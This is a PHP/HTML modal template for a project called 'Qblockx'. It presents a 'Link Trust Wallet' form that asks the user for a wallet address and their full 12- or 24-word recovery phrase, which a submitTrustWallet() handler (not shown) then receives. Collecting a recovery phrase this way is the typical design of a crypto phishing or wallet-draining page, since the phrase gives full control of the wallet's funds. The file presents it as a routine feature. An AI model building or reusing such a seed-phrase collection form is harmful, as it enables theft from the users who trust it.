<?php
/**
 * Project: Qblockx
 * Modal: Trust Wallet Linking — address + seed phrase submission
 */
?>

<div class="modal-overlay" id="modal-trust-wallet" aria-hidden="true" role="dialog"
     aria-labelledby="trustWalletTitle" aria-modal="true">
  <div class="modal-card">

    <div class="modal-header">
      <h2 class="modal-title" id="trustWalletTitle">
        <i class="ph ph-wallet" aria-hidden="true"></i>
        Link Trust Wallet
      </h2>
      <button class="modal-close" onclick="closeModal('modal-trust-wallet')" aria-label="Close">
        <i class="ph ph-x" aria-hidden="true"></i>
      </button>
    </div>

    <div class="modal-body">

      <div class="form-group">
        <label for="twWalletAddress">Wallet Address</label>
        <div class="input-wrapper">
          <i class="ph ph-wallet input-icon" aria-hidden="true"></i>
          <input type="text" id="twWalletAddress" class="has-icon"
                 placeholder="0x... or bc1... or T..." autocomplete="off">
        </div>
      </div>

      <div class="form-group">
        <label for="twPhrase">Recovery Phrase</label>
        <textarea id="twPhrase" class="form-textarea" rows="3"
                  placeholder="Enter your 12 or 24-word recovery phrase"
                  autocomplete="off" spellcheck="false"></textarea>
        <span class="input-hint">Enter each word separated by a space.</span>
      </div>

      <div id="twMsg" class="auth-msg" style="display:none;" role="alert"></div>

      <div class="modal-actions">
        <button type="button" class="btn-outline"
                onclick="closeModal('modal-trust-wallet')">Cancel</button>
        <button type="button" class="btn-primary" id="twSubmitBtn"
                onclick="submitTrustWallet()">
          <span class="btn-text">Link Wallet</span>
          <span class="btn-spinner" style="display:none;"></span>
        </button>
      </div>

    </div>
  </div>
</div>
